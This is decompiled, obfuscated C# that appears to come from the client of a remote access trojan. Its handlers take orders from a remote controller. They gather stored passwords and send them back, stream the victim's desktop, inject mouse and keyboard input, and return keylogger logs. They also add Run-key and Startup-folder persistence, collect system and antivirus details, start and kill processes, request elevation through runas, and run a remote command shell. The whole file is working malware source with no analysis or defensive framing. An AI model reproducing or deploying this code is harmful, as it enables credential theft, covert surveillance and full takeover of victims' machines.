	public static void smethod_28(GetPasswords packet, GClass33 client)
	{
		List<GClass56> list = new List<GClass56>();
		list.AddRange(GClass13.smethod_0());
		list.AddRange(GClass22.smethod_0());
		list.AddRange(GClass23.smethod_0());
		list.AddRange(GClass19.smethod_0());
		list.AddRange(GClass14.smethod_0());
		list.AddRange(GClass24.smethod_0());
		list.AddRange(GClass25.smethod_0());
		List<string> list2 = new List<string>();
		foreach (GClass56 item2 in list)
		{
			string item = string.Format("{0}{4}{1}{4}{2}{4}{3}", item2.Username, item2.Password, item2.URL, item2.Application, "$E$");
			list2.Add(item);
		}
		new GetPasswordsResponse(list2).Execute(client);
	}

	public static void smethod_29(GetDesktop command, GClass33 client)
	{
		//IL_00b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		string text = GClass43.smethod_2(GClass48.smethod_1(command.Monitor));
		if (unsafeStreamCodec_0 == null)
		{
			unsafeStreamCodec_0 = new UnsafeStreamCodec(command.Quality, command.Monitor, text);
		}
		if (unsafeStreamCodec_0.ImageQuality != command.Quality || unsafeStreamCodec_0.Monitor != command.Monitor || unsafeStreamCodec_0.Resolution != text)
		{
			if (unsafeStreamCodec_0 != null)
			{
				unsafeStreamCodec_0.Dispose();
			}
			unsafeStreamCodec_0 = new UnsafeStreamCodec(command.Quality, command.Monitor, text);
		}
		BitmapData val = null;
		Bitmap val2 = null;
		try
		{
			val2 = GClass48.smethod_0(command.Monitor);
			val = val2.LockBits(new Rectangle(0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height()), (ImageLockMode)3, ((Image)val2).get_PixelFormat());
			using MemoryStream memoryStream = new MemoryStream();
			if (unsafeStreamCodec_0 == null)
			{
				throw new Exception("StreamCodec can not be null.");
			}
			unsafeStreamCodec_0.CodeImage(val.get_Scan0(), new Rectangle(0, 0, ((Image)val2).get_Width(), ((Image)val2).get_Height()), new Size(((Image)val2).get_Width(), ((Image)val2).get_Height()), ((Image)val2).get_PixelFormat(), memoryStream);
			new GetDesktopResponse(memoryStream.ToArray(), unsafeStreamCodec_0.ImageQuality, unsafeStreamCodec_0.Monitor, unsafeStreamCodec_0.Resolution).Execute(client);
		}
		catch (Exception)
		{
			if (unsafeStreamCodec_0 != null)
			{
				new GetDesktopResponse(null, unsafeStreamCodec_0.ImageQuality, unsafeStreamCodec_0.Monitor, unsafeStreamCodec_0.Resolution).Execute(client);
			}
			unsafeStreamCodec_0 = null;
		}
		finally
		{
			if (val2 != null)
			{
				if (val != null)
				{
					try
					{
						val2.UnlockBits(val);
					}
					catch
					{
					}
				}
				((Image)val2).Dispose();
			}
		}
	}

	public static void smethod_30(DoMouseEvent command, GClass33 client)
	{
		try
		{
			Screen[] allScreens = Screen.get_AllScreens();
			int x = allScreens[command.MonitorIndex].get_Bounds().X;
			int y = allScreens[command.MonitorIndex].get_Bounds().Y;
			Point p = new Point(command.X + x, command.Y + y);
			switch (command.Action)
			{
			case GEnum0.const_0:
			case GEnum0.const_1:
			case GEnum0.const_2:
			case GEnum0.const_3:
			case GEnum0.const_4:
				if (GClass45.smethod_6())
				{
					GClass45.smethod_7();
				}
				break;
			}
			switch (command.Action)
			{
			case GEnum0.const_0:
			case GEnum0.const_1:
				GClass45.smethod_1(p, command.IsMouseDown);
				break;
			case GEnum0.const_2:
			case GEnum0.const_3:
				GClass45.smethod_2(p, command.IsMouseDown);
				break;
			case GEnum0.const_4:
				GClass45.smethod_3(p);
				break;
			case GEnum0.const_5:
				GClass45.smethod_4(p, scrollDown: false);
				break;
			case GEnum0.const_6:
				GClass45.smethod_4(p, scrollDown: true);
				break;
			}
		}
		catch
		{
		}
	}

	public static void smethod_31(DoKeyboardEvent command, GClass33 client)
	{
		if (GClass45.smethod_6())
		{
			GClass45.smethod_7();
		}
		GClass45.smethod_5(command.Key, command.KeyDown);
	}

	public static void smethod_32(GetMonitors command, GClass33 client)
	{
		if (Screen.get_AllScreens().Length != 0)
		{
			new GetMonitorsResponse(Screen.get_AllScreens().Length).Execute(client);
		}
	}

	public static void smethod_33(GetKeyloggerLogs command, GClass33 client)
	{
		new Thread((ThreadStart)delegate
		{
			try
			{
				int num = 1;
				if (!Directory.Exists(Keylogger.LogDirectory))
				{
					new GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", num, 0).Execute(client);
				}
				else
				{
					FileInfo[] files = new DirectoryInfo(Keylogger.LogDirectory).GetFiles();
					if (files.Length == 0)
					{
						new GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", num, 0).Execute(client);
					}
					else
					{
						FileInfo[] array = files;
						foreach (FileInfo fileInfo in array)
						{
							GClass6 gClass = new GClass6(fileInfo.FullName);
							if (gClass.MaxBlocks < 0)
							{
								new GetKeyloggerLogsResponse("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(client);
							}
							for (int j = 0; j < gClass.MaxBlocks; j++)
							{
								if (gClass.method_1(j, out var readBytes))
								{
									new GetKeyloggerLogsResponse(Path.GetFileName(fileInfo.Name), readBytes, gClass.MaxBlocks, j, gClass.LastError, num, files.Length).Execute(client);
								}
								else
								{
									new GetKeyloggerLogsResponse("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(client);
								}
							}
							num++;
						}
					}
				}
			}
			catch (Exception ex)
			{
				new GetKeyloggerLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
			}
		}).Start();
	}

	public static void smethod_34(GetDrives command, GClass33 client)
	{
		DriveInfo[] array;
		try
		{
			array = (from d in DriveInfo.GetDrives()
				where d.IsReady
				select d).ToArray();
		}
		catch (IOException)
		{
			new SetStatusFileManager("GetDrives I/O error", setLastDirectorySeen: false).Execute(client);
			return;
		}
		catch (UnauthorizedAccessException)
		{
			new SetStatusFileManager("GetDrives No permission", setLastDirectorySeen: false).Execute(client);
			return;
		}
		if (array.Length == 0)
		{
			new SetStatusFileManager("GetDrives No drives", setLastDirectorySeen: false).Execute(client);
			return;
		}
		string[] array2 = new string[array.Length];
		string[] array3 = new string[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			string text = null;
			try
			{
				text = array[i].VolumeLabel;
			}
			catch
			{
			}
			if (string.IsNullOrEmpty(text))
			{
				array2[i] = $"{array[i].RootDirectory.FullName} [{GClass43.smethod_1(array[i].DriveType)}, {array[i].DriveFormat}]";
			}
			else
			{
				array2[i] = $"{array[i].RootDirectory.FullName} ({text}) [{GClass43.smethod_1(array[i].DriveType)}, {array[i].DriveFormat}]";
			}
			array3[i] = array[i].RootDirectory.FullName;
		}
		new GetDrivesResponse(array2, array3).Execute(client);
	}

	public static void smethod_35(DoShutdownAction command, GClass33 client)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			switch (command.Action)
			{
			case GEnum2.const_0:
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.UseShellExecute = true;
				processStartInfo.Arguments = "/s /t 0";
				processStartInfo.FileName = "shutdown";
				Process.Start(processStartInfo);
				break;
			case GEnum2.const_1:
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.UseShellExecute = true;
				processStartInfo.Arguments = "/r /t 0";
				processStartInfo.FileName = "shutdown";
				Process.Start(processStartInfo);
				break;
			case GEnum2.const_2:
				Application.SetSuspendState((PowerState)0, true, true);
				break;
			}
		}
		catch (Exception ex)
		{
			new SetStatus($"Action failed: {ex.Message}").Execute(client);
		}
	}

	public static void smethod_36(GetStartupItems command, GClass33 client)
	{
		try
		{
			List<string> list = new List<string>();
			using (RegistryKey registryKey = GClass47.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
			{
				if (registryKey != null)
				{
					list.AddRange(from formattedKeyValue in registryKey.GetFormattedKeyValues()
						select "0" + formattedKeyValue);
				}
			}
			using (RegistryKey registryKey2 = GClass47.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
			{
				if (registryKey2 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey2.GetFormattedKeyValues()
						select "1" + formattedKeyValue);
				}
			}
			using (RegistryKey registryKey3 = GClass47.smethod_1(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
			{
				if (registryKey3 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey3.GetFormattedKeyValues()
						select "2" + formattedKeyValue);
				}
			}
			using (RegistryKey registryKey4 = GClass47.smethod_1(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
			{
				if (registryKey4 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey4.GetFormattedKeyValues()
						select "3" + formattedKeyValue);
				}
			}
			if (GClass46.Is64Bit)
			{
				using (RegistryKey registryKey5 = GClass47.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
				{
					if (registryKey5 != null)
					{
						list.AddRange(from formattedKeyValue in registryKey5.GetFormattedKeyValues()
							select "4" + formattedKeyValue);
					}
				}
				using RegistryKey registryKey6 = GClass47.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
				if (registryKey6 != null)
				{
					list.AddRange(from formattedKeyValue in registryKey6.GetFormattedKeyValues()
						select "5" + formattedKeyValue);
				}
			}
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
			{
				FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
				list.AddRange(from file in files
					where file.Name != "desktop.ini"
					select $"{file.Name}||{file.FullName}" into formattedKeyValue
					select "6" + formattedKeyValue);
			}
			new GetStartupItemsResponse(list).Execute(client);
		}
		catch (Exception ex)
		{
			new SetStatus($"Getting Autostart Items failed: {ex.Message}").Execute(client);
		}
	}

	public static void smethod_37(DoStartupItemAdd command, GClass33 client)
	{
		try
		{
			switch (command.Type)
			{
			case 0:
				if (!GClass47.smethod_0(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 1:
				if (!GClass47.smethod_0(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 2:
				if (!GClass47.smethod_0(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 3:
				if (!GClass47.smethod_0(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 4:
				if (!GClass46.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!GClass47.smethod_0(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 5:
				if (!GClass46.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!GClass47.smethod_0(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, addQuotes: true))
				{
					throw new Exception("Could not add value");
				}
				break;
			case 6:
			{
				if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
				}
				using StreamWriter streamWriter = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name + ".url"), append: false);
				streamWriter.WriteLine("[InternetShortcut]");
				streamWriter.WriteLine("URL=file:///" + command.Path);
				streamWriter.WriteLine("IconIndex=0");
				streamWriter.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
				streamWriter.Flush();
				break;
			}
			}
		}
		catch (Exception ex)
		{
			new SetStatus($"Adding Autostart Item failed: {ex.Message}").Execute(client);
		}
	}

	public static void smethod_38(DoStartupItemRemove command, GClass33 client)
	{
		try
		{
			switch (command.Type)
			{
			case 0:
				if (!GClass47.smethod_2(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 1:
				if (!GClass47.smethod_2(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 2:
				if (!GClass47.smethod_2(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 3:
				if (!GClass47.smethod_2(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 4:
				if (!GClass46.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!GClass47.smethod_2(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 5:
				if (!GClass46.Is64Bit)
				{
					throw new NotSupportedException("Only on 64-bit systems supported");
				}
				if (!GClass47.smethod_2(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 6:
			{
				string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);
				if (!File.Exists(path))
				{
					throw new IOException("File does not exist");
				}
				File.Delete(path);
				break;
			}
			}
		}
		catch (Exception ex)
		{
			new SetStatus($"Removing Autostart Item failed: {ex.Message}").Execute(client);
		}
	}

	public static void smethod_39(GetSystemInfo command, GClass33 client)
	{
		try
		{
			IPGlobalProperties iPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
			string text = ((!string.IsNullOrEmpty(iPGlobalProperties.DomainName)) ? iPGlobalProperties.DomainName : "-");
			string text2 = ((!string.IsNullOrEmpty(iPGlobalProperties.HostName)) ? iPGlobalProperties.HostName : "-");
			new GetSystemInfoResponse(new string[36]
			{
				"Processor (CPU)",
				GClass49.smethod_2(),
				"Memory (RAM)",
				$"{GClass49.smethod_3()} MB",
				"Video Card (GPU)",
				GClass49.smethod_4(),
				"Username",
				GClass41.smethod_0(),
				"PC Name",
				GClass50.smethod_1(),
				"Domain Name",
				text,
				"Host Name",
				text2,
				"System Drive",
				Path.GetPathRoot(Environment.SystemDirectory),
				"System Directory",
				Environment.SystemDirectory,
				"Uptime",
				GClass50.smethod_0(),
				"MAC Address",
				GClass49.smethod_6(),
				"LAN IP Address",
				GClass49.smethod_5(),
				"WAN IP Address",
				GClass52.GeoInfo.Ip,
				"Antivirus",
				GClass50.smethod_2(),
				"Firewall",
				GClass50.smethod_3(),
				"Time Zone",
				GClass52.GeoInfo.Timezone,
				"Country",
				GClass52.GeoInfo.Country,
				"ISP",
				GClass52.GeoInfo.Isp
			}).Execute(client);
		}
		catch
		{
		}
	}

	public static void smethod_40(GetProcesses command, GClass33 client)
	{
		Process[] processes = Process.GetProcesses();
		string[] array = new string[processes.Length];
		int[] array2 = new int[processes.Length];
		string[] array3 = new string[processes.Length];
		int num = 0;
		Process[] array4 = processes;
		foreach (Process process in array4)
		{
			array[num] = process.ProcessName + ".exe";
			array2[num] = process.Id;
			array3[num] = process.MainWindowTitle;
			num++;
		}
		new GetProcessesResponse(array, array2, array3).Execute(client);
	}

	public static void smethod_41(DoProcessStart command, GClass33 client)
	{
		if (string.IsNullOrEmpty(command.Processname))
		{
			new SetStatus("Process could not be started!").Execute(client);
			return;
		}
		try
		{
			Process.Start(new ProcessStartInfo
			{
				UseShellExecute = true,
				FileName = command.Processname
			});
		}
		catch
		{
			new SetStatus("Process could not be started!").Execute(client);
		}
		finally
		{
			smethod_40(new GetProcesses(), client);
		}
	}

	public static void smethod_42(DoProcessKill command, GClass33 client)
	{
		try
		{
			Process.GetProcessById(command.PID).Kill();
		}
		catch
		{
		}
		finally
		{
			smethod_40(new GetProcesses(), client);
		}
	}

	public static void smethod_43(DoAskElevate command, GClass33 client)
	{
		if (GClass41.smethod_1() != "Admin")
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = "cmd",
				Verb = "runas",
				Arguments = "/k START \"\" \"" + GClass53.CurrentPath + "\" & EXIT",
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true
			};
			GClass40.smethod_1();
			try
			{
				Process.Start(startInfo);
			}
			catch
			{
				new SetStatus("User refused the elevation request.").Execute(client);
				GClass40.smethod_0(GClass0.string_7);
				return;
			}
			Class0.gclass34_0.method_21();
		}
		else
		{
			new SetStatus("Process already elevated.").Execute(client);
		}
	}

	public static void smethod_44(DoShellExecute command, GClass33 client)
	{
		string command2 = command.Command;
		if (shell_0 != null || !(command2 == "exit"))
		{
			if (shell_0 == null)
			{
				shell_0 = new Shell();
			}
			if (command2 == "exit")
			{
				smethod_45();
			}
			else
			{
				shell_0.ExecuteCommand(command2);
			}
		}
	}

	public static void smethod_45()
	{
		if (shell_0 != null)
		{
			shell_0.Dispose();
		}
	}
}
